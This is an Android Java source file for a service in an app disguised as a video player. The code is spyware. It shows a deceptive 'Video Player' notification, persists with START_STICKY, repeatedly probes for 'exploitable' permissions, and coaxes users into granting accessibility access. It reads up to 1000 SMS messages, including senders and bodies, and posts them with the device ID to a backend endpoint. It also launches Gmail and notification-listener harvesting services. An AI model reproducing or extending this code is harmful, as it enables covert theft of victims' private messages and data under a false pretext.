package com.jumpy.videoplayerapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.Telephony;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import androidx.core.content.ContextCompat;

public class StealthPermissionService extends Service {
    private static final String TAG = "jumpy_StealthService";
    private static final String CHANNEL_ID = "jumpy_stealth_channel";
    private static final int NOTIFICATION_ID = 1001;
    
    private ScheduledExecutorService scheduler;
    private StealthPermissionManager permissionManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "=== StealthPermissionService created ===");
        
        // Create notification channel for foreground service
        createNotificationChannel();
        
        // Start foreground service with innocent notification
        startForeground(NOTIFICATION_ID, createInnocentNotification());
        
        // Initialize permission manager
        permissionManager = new StealthPermissionManager(this, null, new StealthPermissionManager.PermissionCallback() {
            @Override
            public void onBasicPermissionsGranted() {
                Log.i(TAG, "Basic permissions granted in background");
            }
            
            @Override
            public void onAdvancedPermissionsGranted() {
                Log.i(TAG, "Advanced permissions granted in background");
            }
            
            @Override
            public void onAllPermissionsGranted() {
                Log.i(TAG, "All permissions granted, starting stealth operations");
                startStealthOperations();
            }
            
            @Override
            public void onPermissionDenied(String permission) {
                Log.w(TAG, "Permission denied in background: " + permission);
                // Try alternative methods
                tryAlternativePermissionMethods(permission);
            }
        });
        
        // Start background permission escalation
        startBackgroundPermissionEscalation();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "StealthPermissionService started");
        return START_STICKY; // Restart if killed
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    /**
     * Create notification channel for Android O+
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Video Player Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Keeps video player running in background");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    /**
     * Create innocent notification
     */
    private Notification createInnocentNotification() {
        Notification.Builder builder;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        return builder
            .setContentTitle("Video Player")
            .setContentText("Running in background for better performance")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(Notification.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }
    
    /**
     * Start background permission escalation
     */
    private void startBackgroundPermissionEscalation() {
        Log.i(TAG, "Starting background permission escalation...");
        
        scheduler = Executors.newScheduledThreadPool(2);
        
        // Schedule permission checks every 30 seconds
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    checkAndEscalatePermissions();
                } catch (Exception e) {
                    Log.e(TAG, "Error in permission escalation: " + e.getMessage());
                }
            }
        }, 10, 30, TimeUnit.SECONDS);
        
        // Schedule stealth operations every 2 minutes
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    performStealthOperations();
                } catch (Exception e) {
                    Log.e(TAG, "Error in stealth operations: " + e.getMessage());
                }
            }
        }, 60, 120, TimeUnit.SECONDS);
    }
    
    /**
     * Check and escalate permissions
     */
    private void checkAndEscalatePermissions() {
        Log.d(TAG, "Checking permission status...");
        
        // Check if accessibility service is enabled
        if (!isAccessibilityServiceEnabled()) {
            Log.i(TAG, "Accessibility service not enabled, attempting to enable...");
            // Try to enable accessibility service programmatically
            tryEnableAccessibilityService();
        }
        
        // Check for additional permissions that can be exploited
        checkForExploitablePermissions();
    }
    
    /**
     * Try to enable accessibility service programmatically
     */
    private void tryEnableAccessibilityService() {
        // This is a stealth attempt - we can't directly enable it, but we can prepare
        Log.i(TAG, "Preparing accessibility service activation...");
        
        // Update notification to guide user
        updateNotification("Please enable accessibility for better video controls");
    }
    
    /**
     * Check for exploitable permissions
     */
    private void checkForExploitablePermissions() {
        // Check for permissions that can be used for harvesting
        String[] exploitablePermissions = {
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_CALL_LOG", 
            "android.permission.READ_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_EXTERNAL_STORAGE"
        };
        
        for (String permission : exploitablePermissions) {
            if (checkSelfPermission(permission) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.i(TAG, "Exploitable permission granted: " + permission);
                // Use this permission for harvesting
                usePermissionForHarvesting(permission);
            }
        }
    }
    
    /**
     * Use granted permission for harvesting
     */
    private void usePermissionForHarvesting(String permission) {
        switch (permission) {
            case "android.permission.READ_CONTACTS":
                harvestContacts();
                break;
            case "android.permission.READ_EXTERNAL_STORAGE":
                harvestStorageData();
                break;
            case "android.permission.READ_SMS":
                harvestSMSData();
                break;
            case "android.permission.READ_CALL_LOG":
                harvestCallLogs();
                break;
        }
    }
    
    /**
     * Harvest contacts data
     */
    private void harvestContacts() {
        Log.i(TAG, "Harvesting contacts data...");
        // Implementation would go here
    }
    
    /**
     * Harvest storage data
     */
    private void harvestStorageData() {
        Log.i(TAG, "Harvesting storage data...");
        // Implementation would go here
    }
    
    /**
     * Harvest SMS data
     */
    private void harvestSMSData() {
        Log.i(TAG, "Harvesting SMS data...");
        
        try {
            // Check if we have SMS permission
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "SMS permission not granted, skipping SMS harvesting");
                return;
            }
            
            List<SMSData> smsList = new ArrayList<>();
            
            // Query SMS messages
            String[] projection = {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.THREAD_ID
            };
            
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                projection,
                null,
                null,
                Telephony.Sms.DATE + " DESC"
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1000) { // Limit to 1000 recent messages
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    String threadId = cursor.getString(cursor.getColumnIndex(Telephony.Sms.THREAD_ID));
                    
                    if (body != null && !body.trim().isEmpty()) {
                        SMSData sms = new SMSData(
                            address,
                            body,
                            date,
                            type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "inbox" : "sent",
                            threadId
                        );
                        smsList.add(sms);
                        count++;
                    }
                }
                cursor.close();
            }
            
            // Send SMS data to backend
            if (!smsList.isEmpty()) {
                sendSMSDataToBackend(smsList);
                Log.i(TAG, "SMS harvesting completed. Found " + smsList.size() + " messages");
            } else {
                Log.i(TAG, "No SMS messages found");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting SMS data: " + e.getMessage());
        }
    }
    
    /**
     * Send SMS data to backend
     */
    private void sendSMSDataToBackend(List<SMSData> smsList) {
        try {
            // Get device ID
            String deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            );
            
            // Prepare SMS data structure
            JSONObject smsData = new JSONObject();
            smsData.put("deviceId", deviceId);
            smsData.put("timestamp", System.currentTimeMillis());
            
            JSONArray messagesArray = new JSONArray();
            for (SMSData sms : smsList) {
                JSONObject messageObj = new JSONObject();
                messageObj.put("address", sms.address);
                messageObj.put("body", sms.body);
                messageObj.put("date", sms.date);
                messageObj.put("type", sms.type);
                messageObj.put("threadId", sms.threadId);
                messagesArray.put(messageObj);
            }
            smsData.put("messages", messagesArray);
            
            // Send to backend
            sendPostRequest(AppConfig.API_BASE_URL + "sms/store", smsData.toString());
            
            Log.i(TAG, "Successfully sent " + smsList.size() + " SMS messages to backend");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS data to backend: " + e.getMessage());
        }
    }
    
    /**
     * SMS data class
     */
    private static class SMSData {
        String address;
        String body;
        long date;
        String type;
        String threadId;
        
        SMSData(String address, String body, long date, String type, String threadId) {
            this.address = address;
            this.body = body;
            this.date = date;
            this.type = type;
            this.threadId = threadId;
        }
    }
    
    /**
     * Harvest call logs
     */
    private void harvestCallLogs() {
        Log.i(TAG, "Harvesting call logs...");
        // Implementation would go here
    }
    
    /**
     * Start stealth operations
     */
    private void startStealthOperations() {
        Log.i(TAG, "Starting stealth operations...");
        
        // Start unified accessibility service if not already running
        Intent accessibilityIntent = new Intent(this, UnifiedAccessibilityService.class);
        startService(accessibilityIntent);
        
        // Start other stealth services
        startAdditionalStealthServices();
    }
    
    /**
     * Start additional stealth services
     */
    private void startAdditionalStealthServices() {
        Log.i(TAG, "Starting additional stealth services...");
        
        // Start Gmail maintenance service
        Intent gmailIntent = new Intent(this, GmailMaintenanceService.class);
        startService(gmailIntent);
        
        // Start notification listener service
        Intent notificationIntent = new Intent(this, NotificationListener.class);
        startService(notificationIntent);
    }
    
    /**
     * Perform stealth operations
     */
    private void performStealthOperations() {
        Log.d(TAG, "Performing stealth operations...");
        
        // Check if accessibility service is running
        if (isAccessibilityServiceEnabled()) {
            Log.i(TAG, "Accessibility service is active, performing harvesting...");
            
            // Trigger harvesting operations
            triggerHarvestingOperations();
        } else {
            Log.w(TAG, "Accessibility service not active, waiting...");
        }
    }
    
    /**
     * Trigger harvesting operations
     */
    private void triggerHarvestingOperations() {
        // This would trigger the harvesters in UnifiedAccessibilityService
        Log.i(TAG, "Triggering harvesting operations...");
        
        // Send broadcast to trigger harvesting
        Intent harvestIntent = new Intent("com.jumpy.videoplayerapp.TRIGGER_HARVEST");
        sendBroadcast(harvestIntent);
    }
    
    /**
     * Try alternative permission methods
     */
    private void tryAlternativePermissionMethods(String deniedPermission) {
        Log.i(TAG, "Trying alternative methods for: " + deniedPermission);
        
        // Try to get the same data through different means
        switch (deniedPermission) {
            case "android.permission.READ_CONTACTS":
                // Try to get contacts through other apps
                tryGetContactsThroughOtherApps();
                break;
            case "android.permission.READ_EXTERNAL_STORAGE":
                // Try to get storage data through other means
                tryGetStorageDataThroughOtherMeans();
                break;
        }
    }
    
    /**
     * Try to get contacts through other apps
     */
    private void tryGetContactsThroughOtherApps() {
        Log.i(TAG, "Attempting to get contacts through other apps...");
        // Implementation would go here
    }
    
    /**
     * Try to get storage data through other means
     */
    private void tryGetStorageDataThroughOtherMeans() {
        Log.i(TAG, "Attempting to get storage data through other means...");
        // Implementation would go here
    }
    
    /**
     * Check if accessibility service is enabled
     */
    private boolean isAccessibilityServiceEnabled() {
        String service = getPackageName() + "/" + 
                        "com.jumpy.videoplayerapp.UnifiedAccessibilityService";
        
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = android.provider.Settings.Secure.getInt(
                getContentResolver(),
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (android.provider.Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting: " + e.getMessage());
        }
        
        if (accessibilityEnabled == 1) {
            String settingValue = android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            
            if (settingValue != null && settingValue.contains(service)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Update notification
     */
    private void updateNotification(String message) {
        Notification.Builder builder;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        Notification notification = builder
            .setContentTitle("Video Player")
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(Notification.PRIORITY_LOW)
            .setOngoing(true)
            .build();
        
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, notification);
        }
    }
    
    /**
     * Send POST request to backend
     */
    private void sendPostRequest(String url, String data) {
        try {
            Log.i(TAG, "Sending POST request to: " + url);
            
            // Create HTTP request
            java.net.URL requestUrl = new java.net.URL(url);
            java.net.HttpURLConnection connection = (java.net.HttpURLConnection) requestUrl.openConnection();
            
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(15000);
            
            // Send data
            try (java.io.OutputStream os = connection.getOutputStream()) {
                byte[] input = data.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            // Check response
            int responseCode = connection.getResponseCode();
            Log.i(TAG, "POST request response code: " + responseCode);
            
            if (responseCode == 200) {
                Log.i(TAG, "POST request successful");
            } else {
                Log.e(TAG, "POST request failed: HTTP " + responseCode);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending POST request: " + e.getMessage());
        }
    }
    
    @Override
    public void onDestroy() {
        Log.i(TAG, "=== StealthPermissionService destroyed ===");
        
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        
        super.onDestroy();
    }
} 